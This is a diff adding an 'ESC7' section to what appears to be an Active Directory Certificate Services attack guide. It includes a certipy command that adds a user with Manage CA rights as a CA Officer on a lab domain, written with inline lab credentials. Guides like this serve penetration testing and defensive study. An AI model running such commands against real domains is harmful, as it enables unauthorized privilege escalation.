@@ -272,6 +272,18 @@ certipy req 'EvilCorp.local/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca '
 <br></br>
 <h3 align="center" id="heading">ESC7: Vulnerable Certificate Authority Access Control:</h3>
 
+
+<p align="center">
+  <img src="https://github.com/RayRRT/ADCS/blob/main/ESC7.png?raw=true)" />
+</p>
+
+How to abuse:
+
+In case we only have one user with **Manage CA** permission, it will be necessary to add us as **Officer**, which will grant us the **Manage Certificates** permission:
+```
+certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -add-officer 'MCUser'
+```
+
 <a name="ECS8"></a>
 <br></br>
 <h3 align="center" id="heading">ESC8: NTLM Relay to AD CS HTTP Endpoints:</h3>
